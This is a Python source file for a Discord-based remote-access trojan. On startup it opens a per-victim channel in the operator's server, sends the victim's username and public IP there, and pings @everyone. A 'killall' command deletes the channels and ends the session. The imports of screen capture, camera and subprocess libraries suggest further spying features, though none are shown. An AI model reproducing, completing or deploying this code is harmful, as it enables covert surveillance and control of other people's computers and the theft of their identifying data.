from concurrent.futures import thread
import discord, os, pyautogui, requests, cv2, numpy, subprocess, threading
from config import *

client = discord.Bot(intents=discord.Intents.all())

@client.event
async def on_ready():
    global channel
    channel = await client.guilds[0].create_text_channel(f"session-{os.getenv('username')}")
    embed = discord.Embed(title="New Session Created", color=0x660cf)
    embed.add_field(name="Username", value=f"```{os.getenv('username')}```")
    embed.add_field(name="IP Address", value=f"```{requests.get('https://api.ipify.org').text}```")
    await channel.send("@everyone", embed=embed)

    global channelid
    channelid = channel.id

@client.slash_command(name="killall", guild_ids=guildid)
async def killall(ctx):
    if ctx.channel.id == channel.id:
        embed = discord.Embed(title="Command Executed", description="```Killing Sessions..```", color=0x660cf)
        await ctx.respond(embed=embed)
        for channel in client.guilds[0].channels:
            try: await channel.delete()
            except Exception: pass 
        os._exit(0)

client.run(token)